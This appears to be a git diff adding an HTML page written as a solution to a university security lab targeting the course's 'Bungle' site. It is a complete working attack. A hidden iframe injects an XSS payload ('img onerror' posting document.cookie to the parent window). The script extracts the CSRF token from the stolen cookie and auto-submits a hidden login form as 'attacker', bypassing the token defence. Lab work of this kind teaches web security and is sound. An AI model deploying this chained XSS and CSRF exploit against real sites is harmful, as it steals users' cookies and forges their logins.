@@ -1,0 +1,38 @@
+<html>
+    <body>
+        <div id='dummy' style="width:1px;height:1px;border:none;">
+             <iframe id='bungle' name='bungle' src='http://bungle-cs461.csl.illinois.edu/search?csrfdefense=1&xssdefense=0&q=<img src=lol onerror=window.parent.postMessage(document.cookie,&quot;*&quot;)>' style="width:1px;height:1px;border:none;">
+             </iframe>
+             <script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/jquery/2.0.0/jquery.min.js">
+             </script>
+           </div> 
+            <script>
+                    //var token = '';
+                    var startIdx = 0;
+                    var endIdx = 0;
+                    
+                    async function parseToken(msg) {
+                        startIdx = msg.indexOf('csrf_token=')+11;
+                        endIdx = msg.indexOf('csrf_token=')+43;
+                        return msg.substring(startIdx,endIdx);
+                    }
+                    
+                    function doSubmit(token) {
+                        var dummy = document.getElementById('dummy');
+                    
+                        var startTag = '<iframe id="csrf" style="width:1px;height:1px;border:none;" srcdoc="';
+                        var endTag = ' style="width:1px;height:1px;border:none;"></iframe>';
+                        window.setTimeout(function() {
+                            var payload = startTag+"<html><body><form action='http://bungle-cs461.csl.illinois.edu/login?csrfdefense=1&xssdefense=0' method='post'><input type='hidden' name='username' value='attacker'><input type='hidden' name='password' value='l33th4x'><input type='hidden' name='csrf_token' value='"+token+"'></form><script>document.forms[0].submit();</scri"+"pt></body></html>"+endTag;
+                            console.log(payload);
+                            dummy.innerHTML = payload;
+                        }, 0);
+                     }
+                    /* pass messages between origins */
+                    window.addEventListener("message", (event) => {
+                        console.log(event.data);
+                        parseToken(event.data).then(token=>doSubmit(token));
+                    }, false);
+            </script>
+    </body>
+</html>
